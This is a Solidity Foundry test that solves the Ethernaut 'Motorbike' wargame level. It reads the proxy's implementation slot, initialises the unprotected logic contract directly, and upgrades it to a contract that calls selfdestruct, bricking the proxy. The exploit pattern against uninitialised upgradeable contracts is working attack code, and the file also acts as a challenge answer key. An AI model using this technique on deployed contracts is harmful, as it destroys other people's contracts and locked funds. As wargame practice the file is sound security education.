// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/utils/Address.sol";
import "../src/Ethernaut.sol";
import "../src/levels/25-Motorbike/Motorbike.sol";
import "../src/levels/25-Motorbike/MotorbikeFactory.sol";

/**
Note on testing:

The tests for this level need to be run in `setUp()`.
Specifically, the `selfdestruct` command. This is because
Foundry does not handle `selfdestruct` well as it doesn't take effect
until the call is over, which it isn't until the test is over.

The workaround and explanation is taken from this issue:
https://github.com/foundry-rs/foundry/issues/1543
*/
contract MotorbikeTest is Test {
    Ethernaut public ethernaut;
    MotorbikeFactory public motorbikeFactory;
    Motorbike public motorbike;

    address public attacker = address(0x1);
    address internal _levelAddr;

    function setUp() public {
        vm.deal(attacker, 10_000 ether);

        ethernaut = new Ethernaut();
        motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);

        vm.startPrank(attacker);
        _levelAddr = ethernaut.createLevelInstance{value: 100 ether}(
            motorbikeFactory
        );
        motorbike = Motorbike(payable(_levelAddr));

        // get logic contract (engine) address from proxy (proxy),
        // which is stored at implementation slot
        bytes32 _IMPLEMENTATION_SLOT = bytes32(
            uint256(keccak256("eip1967.proxy.implementation")) - 1
        );
        bytes32 engineAddrBytes32 = vm.load(
            address(motorbike),
            _IMPLEMENTATION_SLOT
        );
        address engineAddr = address(bytes20(engineAddrBytes32 << 96));

        // initialize logic contract directly
        Engine engine = Engine(engineAddr);
        engine.initialize();

        // upgrade proxy to attack contract & destroy itself
        // bricking the logic contract, alogn with the proxy contract
        engine.upgradeToAndCall(
            address(new MotorbikeAttack()),
            abi.encodeWithSignature("destroy()")
        );
    }

    function testAttack() public {
        // Submit level
        bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }
}

contract MotorbikeAttack {
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}
